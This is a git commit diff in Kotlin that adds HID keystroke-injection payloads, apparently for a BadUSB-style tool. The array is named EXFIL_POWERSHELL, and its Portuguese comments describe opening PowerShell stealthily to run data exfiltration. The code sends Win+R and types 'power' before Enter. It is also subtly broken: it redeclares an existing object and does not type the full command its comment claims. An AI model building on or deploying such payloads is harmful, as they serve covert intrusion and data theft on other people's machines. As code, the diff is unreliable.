ef0e067e1bf0f859cea57792210fd9549811d129
Guilherme Lucas Tonaco Carvalho <guilhermelucas912@gmail.com>
2026-02-09 01:29:32 -0300

    Update PayloadExecutor.kt

--- PayloadExecutor.kt
+++ PayloadExecutor.kt
@@ -10,3 +10,17 @@ object HidPayloads {
         byteArrayOf(0x00, 0x28, 0x00, 0, 0, 0, 0, 0)  // ENTER
     )
 }
+object HidPayloads {
+    // Sequência para abrir o PowerShell de forma furtiva e executar exfiltração
+    val EXFIL_POWERSHELL = arrayOf(
+        byteArrayOf(0x08, 0x15, 0x00, 0, 0, 0, 0, 0), // Win + R
+        byteArrayOf(0x00, 0x00, 0x00, 0, 0, 0, 0, 0), // Release
+        // Digita 'powershell' (Abreviação para agilizar a execução)
+        byteArrayOf(0x00, 0x13, 0x00, 0, 0, 0, 0, 0), // 'p'
+        byteArrayOf(0x00, 0x12, 0x00, 0, 0, 0, 0, 0), // 'o'
+        byteArrayOf(0x00, 0x1A, 0x00, 0, 0, 0, 0, 0), // 'w'
+        byteArrayOf(0x00, 0x08, 0x00, 0, 0, 0, 0, 0), // 'e'
+        byteArrayOf(0x00, 0x15, 0x00, 0, 0, 0, 0, 0), // 'r'
+        byteArrayOf(0x00, 0x28, 0x00, 0, 0, 0, 0, 0)  // ENTER
+    )
+}
